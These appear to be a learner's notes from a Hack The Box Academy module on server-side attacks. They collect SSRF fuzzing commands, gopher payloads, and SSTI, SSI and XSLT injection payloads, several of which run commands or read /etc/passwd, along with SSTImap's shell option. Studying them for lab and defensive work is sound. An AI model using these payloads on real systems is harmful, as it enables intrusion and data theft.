# Introduction to Server-side Attacks

**Commands**

**Payloads**

**Endpoints / Paths**

**Tools / Services**

**Reusable Snippets**


# Introduction to SSRF 
**Commands**

**Payloads**  
http://  
https://  
file://  
gopher://

**Endpoints / Paths**

**Tools / Services**

**Reusable Snippets**  
[https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)  
[https://academy.hackthebox.com/module/details/231](https://academy.hackthebox.com/module/details/231)

# Identifying SSRF 

**Commands**

```
nc -lnvp 8000
```

```
seq 1 10000 > ports.txt
```

```
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

**Payloads**  
dateserver=[http://172.17.0.1:8000/ssrf](http://172.17.0.1:8000/ssrf)  
dateserver=[http://127.0.0.1/index.php](http://127.0.0.1/index.php)  
dateserver=[http://127.0.0.1:FUZZ/](http://127.0.0.1:FUZZ/)  
date=2024-01-01

**Endpoints / Paths**  
/index.php

**Tools / Services**  
Burp  
netcat  
ffuf

**Reusable Snippets**  
Content-Type: application/x-www-form-urlencoded  
Failed to connect to  
127.0.0.1  
172.17.0.1  
172.17.0.2  
3306  
80

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  -u http://10.129.21.254/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```



ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  -u http://94.237.123.185//index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php" -fr "Server at dateserver.htb Port 80"
# Exploiting SSRF 

**Commands**

```
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

```
python2.7 gopherus.py
```

```
python2.7 gopherus.py --exploit smtp
```

**Payloads**

```
dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01
```

```
file:///etc/passwd
```

```
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

```
dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

```
gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.
```

**Endpoints / Paths**

```
/index.php
/admin.php
/availability.php
```

**Tools / Services**

```
ffuf
gopher
Gopherus
Apache
MySQL
PostgreSQL
FastCGI
Redis
SMTP
Zabbix
pymemcache
rbmemcache
phpmemcache
dmpmemcache
```

**Reusable Snippets**

```
Server at dateserver.htb Port 80
Content-Type: application/x-www-form-urlencoded
adminpw=admin
dateserver.htb
file://
gopher://
```



ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80" -fs 400,404,403


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80" -fs 400,404,403
```
# Blind SSRF 

**Commands**

```
nc -lnvp 8000
```

**Payloads**

```
dateserver=http://172.17.0.1:8000/index.php
```

```
dateserver=http://127.0.0.1:PORT
```

```
dateserver=file:///etc/passwd
```

```
dateserver=file:///nonexistentfile
```

**Endpoints / Paths**

```
/index.php
```

**Tools / Services**

```
netcat
Apache
MySQL
```

**Reusable Snippets**

```
Something went wrong!
Date is unavailable.
127.0.0.1
file://
http://
```


```
ffuf -s -w ports.txt -u http://10.129.22.81/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Something went wrong" -fs 400,403,404
```

``` WORKING
ffuf -s -w ports.txt -u http://94.237.123.185:53282/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://truckapi.htb:FUZZ/?id%3DFusionExpress01" -fr "Failed to connect"
```
65537
# Preventing SSRF

**Commands**

**Payloads**

**Endpoints / Paths**

**Tools / Services**

**Reusable Snippets**  
[https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)


# Template Engines

**Commands**

**Payloads**

**Endpoints / Paths**

**Tools / Services**  
Jinja  
Twig

**Reusable Snippets**

```jinja2
Hello {{ name }}!
```

```txt
Hello vautia!
```

```jinja2
{% for name in names %}
Hello {{ name }}!
{% endfor %}
```

```txt
Hello vautia!
Hello 21y4d!
Hello Pedant!
```


# Introduction to SSTI

**Commands**

**Payloads**

**Endpoints / Paths**

**Tools / Services**  
Template Engine

**Reusable Snippets**


# Identifying SSTI

**Commands**

**Payloads**

```
${{<%[%'"}}%\.
```

```
${7*7}
```

```
{{7*7}}
```

```
{{7*'7'}}
```

**Endpoints / Paths**

**Tools / Services**  
Template Engine

**Reusable Snippets**

Therefore, we follow the green arrow and inject the payload `{{7*'7'}}`. The result will enable us to deduce the template engine used by the web application. In Jinja, the result will be `7777777`, while in Twig, the result will be `49`.
```
49
7777777
```

![[Pasted image 20260203120236.png]]


# Exploiting SSTI – Jinja2

**Commands**

**Payloads**

```jinja2
{{ config.items() }}
```

```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```
${self.module.cache.util.os.popen('whoami').read()}
```
**Endpoints / Paths**

```
/
```

**Tools / Services**

```
Jinja2
Flask
Python
```

**Reusable Snippets**

```
self.__init__.__globals__
__builtins__
__import__
os
popen
open
```

```
{{ self.__init__.__globals__.__builtins__.open("/flag.txt").read() }}
```
# Exploiting SSTI – Twig

**Commands**

**Payloads**

```twig
{{ _self }}
```

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

```twig
{{ ['id'] | filter('system') }}
```

**Endpoints / Paths**

```
/
```

**Tools / Services**

```
Twig
PHP
Symfony
```

**Reusable Snippets**

```
_self
file_excerpt
filter
system
/etc/passwd
id
```

```
{{ ['cat$IFS/flag.txt'] | filter('system') }}
```

# SSTI Tools of the Trade & Preventing SSTI

**Commands**

```
git clone https://github.com/vladko312/SSTImap
```

```
cd SSTImap
```

```
pip3 install -r requirements.txt
```

```
python3 sstimap.py
```

```
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```

```
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
```

```
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
```

```
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

**Payloads**

**Endpoints / Paths**

```
/index.php
```

**Tools / Services**

```
SSTImap
tplmap
Python3
Twig
PHP
Linux
```

**Reusable Snippets**

```
-u
-D
-S
--os-shell
```


# Introduction to SSI Injection

**Commands**

**Payloads**

```ssi
<!--#printenv -->
```

```ssi
<!--#config errmsg="Error!" -->
```

- `DOCUMENT_NAME`: the current file's name
- `DOCUMENT_URI`: the current file's URI
- `LAST_MODIFIED`: timestamp of the last modification of the current file
- `DATE_LOCAL`: local server time

```ssi
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```

```ssi
<!--#exec cmd="whoami" -->
```

```ssi
<!--#include virtual="index.html" -->
```

**Endpoints / Paths**

**Tools / Services**  
Apache  
IIS

**Reusable Snippets**

```ssi
<!--#name param1="value1" param2="value" -->
```

.shtml  
.shtm  
.stm


# Exploiting SSI Injection 
**Commands**

**Payloads**

```ssi
<!--#printenv -->
```

```ssi
<!--#exec cmd="id" -->
```

```ssi
<!--#exec cmd="whoami" -->
```

```ssi
<!--#exec cmd="cat /etc/passwd" -->
```

```ssi
<!--#exec cmd="cat /flag.txt" -->
```

**Endpoints / Paths**

```
/
 /page.shtml
```

**Tools / Services**

```
Apache
SSI
```

**Reusable Snippets**

```ssi
<!--#exec cmd="COMMAND" -->
```

.shtml


```
 <!--#exec cmd="cat /flag.txt" -->:
```
# Preventing SSI Injection

**Commands**

**Payloads**

**Endpoints / Paths**

**Tools / Services**  
Apache  
IIS

**Reusable Snippets**


# Intro to XSLT Injection 
**Commands**

**Payloads**

**Endpoints / Paths**

**Tools / Services**  
XSLT  
XML  
XSLT Processor

**Reusable Snippets**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```

```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all the fruits:
		<xsl:for-each select="fruit">
			<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```

```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all fruits of medium size ordered by their color:
		<xsl:for-each select="fruit">
			<xsl:sort select="color" order="descending" />
			<xsl:if test="size = 'Medium'">
				<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
			</xsl:if>
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```

# Exploiting XSLT Injection

**Commands**

**Payloads**

```xml
<
```

```xml
<xsl:value-of select="system-property('xsl:version')" />
```

```xml
<xsl:value-of select="system-property('xsl:vendor')" />
```

```xml
<xsl:value-of select="system-property('xsl:vendor-url')" />
```

```xml
<xsl:value-of select="system-property('xsl:product-name')" />
```

```xml
<xsl:value-of select="system-property('xsl:product-version')" />
```

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

```xml
<xsl:value-of select="php:function('system','id')" />
```

**Endpoints / Paths**

```
/index.php
```

**Tools / Services**

```
XSLT
libxslt
PHP
```

**Reusable Snippets**

```
system-property()
php:function()
file_get_contents
system
/etc/passwd
id
```


# Preventing XSLT Injection

**Commands**

**Payloads**

**Endpoints / Paths**

**Tools / Services**  
XSLT Processor  
libxslt  
PHP

**Reusable Snippets**  
<  
>


#


```
api=http://truckapi.htb/?id%3D{{7*'7'}}
```

```
api=http://truckapi.htb/?id%3D{{['cat$IFS/flag.txt']|filter('system')}}
```
#
#